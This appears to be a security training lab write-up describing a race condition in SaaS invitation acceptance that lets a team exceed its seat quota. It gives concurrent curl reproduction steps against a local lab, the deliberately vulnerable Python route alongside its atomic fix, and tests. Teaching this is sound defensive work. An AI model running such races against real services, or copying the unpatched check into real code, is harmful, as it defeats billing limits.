# Lab 18 — Invitation Acceptance Exceeding Seat Limit

## 1. Objective

Demonstrate how race conditions in multi-tenant invitation acceptance allow organizations to exceed contracted user seat quotas.

## 2. Scenario

A SaaS application offers team subscription tiers with a contractual seat maximum (`max_seats`). Team administrators can dispatch invitations to prospective members. When an invited member accepts an invitation, the endpoint checks whether `used_seats < max_seats`. If capacity exists, it marks the invitation as accepted and increments `used_seats`. Because the seat check and counter increment are decoupled, multiple invitees accepting invitations simultaneously can exceed the maximum seat limit.

**Trust boundary:** The application assumed that seat limits could be enforced safely through application-level conditional checks.

## 3. Preconditions

| Item | Value |
|------|-------|
| Target endpoint | `/lab/logic/logic-03/accept-invite` |
| Team quota | Team 1 (`max_seats: 3`, `used_seats: 2`) |
| Pending invitations | Invitations `1`, `2`, and `3` |
| Authenticated user | `alice` / `alice123` |
| Seed state | Initial database seed (`POST /lab/logic/logic-03/reset`) |

## 4. Vulnerability Mechanism

When an invitation is accepted, the server retrieves the current seat count:

```sql
SELECT * FROM team_seats WHERE team_id = ?
```

It validates that `used_seats < max_seats` in application memory. It then executes:

```sql
UPDATE team_seats SET used_seats = used_seats + 1 WHERE team_id = ?
UPDATE invitations SET accepted = 1 WHERE id = ?
```

When multiple pending invitations are accepted concurrently, both requests read `used_seats = 2`, both observe that `2 < 3`, and both execute the increment, causing `used_seats` to reach 4 (exceeding the licensed maximum of 3).

## 5. Reproduction

1. Authenticate as `alice`:

```bash
curl -c cookies.txt -X POST http://localhost:5000/login \
  -d "username=alice&password=alice123"
```

2. Reset team invitations and seat counts:

```bash
curl -b cookies.txt -X POST http://localhost:5000/lab/logic/logic-03/reset
```

3. Submit concurrent invitation acceptances for invitations 1 and 2:

```bash
curl -b cookies.txt -X POST http://localhost:5000/lab/logic/logic-03/accept-invite \
  -H "Content-Type: application/json" \
  -d '{"invitation_id": 1}' &
curl -b cookies.txt -X POST http://localhost:5000/lab/logic/logic-03/accept-invite \
  -H "Content-Type: application/json" \
  -d '{"invitation_id": 2}' &
wait
```

4. Check team seat allocation:

```bash
curl -b cookies.txt http://localhost:5000/lab/logic/logic-03/seats
```

## 6. Evidence

Both invitation acceptance calls return HTTP 200:

```json
{
  "invitation_id": 1,
  "status": "accepted"
}
```

The team seats overview reveals `used_seats: 4` against `max_seats: 3`:

```json
{
  "seats": [
    {"id": 1, "max_seats": 3, "team_id": 1, "used_seats": 4}
  ]
}
```

## 7. Root Cause

**File:** `app/routes/logic.py`  
**Function:** `lab18_accept()`

The route checks `used_seats >= max_seats` in Python memory instead of enforcing quota constraints atomically within the database query:

```python
if patched:
    cur = db.execute(
        "UPDATE team_seats SET used_seats = used_seats + 1 WHERE team_id = ? AND used_seats < max_seats",
        (team_id,)
    )
    db.commit()
    if cur.rowcount == 0:
        return jsonify({'error': 'No seats available'}), 400
else:
    seats = db.execute("SELECT * FROM team_seats WHERE team_id = ?", (team_id,)).fetchone()
    if seats['used_seats'] >= seats['max_seats']:
        return jsonify({'error': 'No seats available'}), 400
    db.execute("UPDATE team_seats SET used_seats = used_seats + 1 WHERE team_id = ?", (team_id,))
```

## 8. Impact

Users can bypass SaaS tier restrictions and billing tiers, provisioning excess accounts without upgrading subscription plans.

## 9. Remediation

Enforce capacity checks atomically inside the database `UPDATE` statement and verify `rowcount`:

```python
cur = db.execute(
    "UPDATE team_seats SET used_seats = used_seats + 1 WHERE team_id = ? AND used_seats < max_seats",
    (team_id,)
)
db.commit()
if cur.rowcount == 0:
    return jsonify({'error': 'No seats available'}), 400

db.execute("UPDATE invitations SET accepted = 1 WHERE id = ?", (invitation_id,))
db.commit()
```

## 10. Regression Validation

**Test:** `tests/test_lab_18.py`

- **Vulnerable mode:** Non-atomic acceptance logic allows multiple invitations to consume the single remaining seat.
- **Patched mode:** Atomic conditional update permits only one invitation to consume the final seat; second invitation returns HTTP 400 (`No seats available`).
- **Legitimate flow:** Single invitation acceptance succeeds when capacity is available.

## 11. Research Discussion

1. Why are database-level `CHECK` constraints (e.g. `CHECK (used_seats <= max_seats)`) effective safety nets for business logic limits?
2. How do multi-tenant SaaS architectures handle asynchronous seat reservation during invitation issuance versus invitation acceptance?
3. What architectural patterns prevent quota races across microservices using event streams (e.g., Apache Kafka or RabbitMQ)?
